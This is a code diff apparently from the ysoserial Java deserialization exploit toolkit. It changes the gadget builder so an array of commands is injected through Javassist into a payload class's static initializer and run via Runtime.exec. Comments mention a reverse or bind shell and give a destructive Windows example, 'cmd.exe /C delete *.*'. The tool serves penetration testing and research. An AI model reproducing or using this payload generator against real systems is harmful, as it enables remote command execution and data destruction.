@@ -9,7 +9,10 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 import javassist.ClassClassPath;
@@ -89,7 +92,7 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
+    public static Object createTemplatesImpl ( final String[] command ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
                 command,
@@ -102,7 +105,7 @@ public class Gadgets {
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl ( final String[] command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
 
@@ -113,7 +116,7 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+        clazz.makeClassInitializer().insertAfter(makeExecCommand(command));
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
@@ -132,6 +135,36 @@ public class Gadgets {
         return templates;
     }
 
+    //Allows for better exploitation Windows ie.
+    ////(new String[]{"cmd.exe", "/C", "delete *.*"})
+	public static String makeExecCommand(final String[] command) {
+		StringBuffer b = new StringBuffer();
+        b.append("java.lang.Runtime.getRuntime().exec(");
+        createStringArray(command, b);
+        b.append(");");
+		return b.toString();
+	}
+
+
+	public static void createStringArray(final String[] command, StringBuffer b) {
+		b.append("new String[]{");
+        for(int i = 0; i < command.length; i++){
+        	b.append("\"" + command[i] + "\"");
+        	if(i < command.length - 1)
+        		b.append(", ");
+        }
+        b.append("}");
+	}
+
+	public static String[] removeFirst(int numToRemove, final String[] args) {
+		List<String> list = new ArrayList<String>(Arrays.asList(args));
+		for(int i = 0; i < numToRemove; i++){
+			list.remove(i);
+		}
+		String[] command = {};
+		command = list.toArray(command);
+		return command;
+	}
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException {
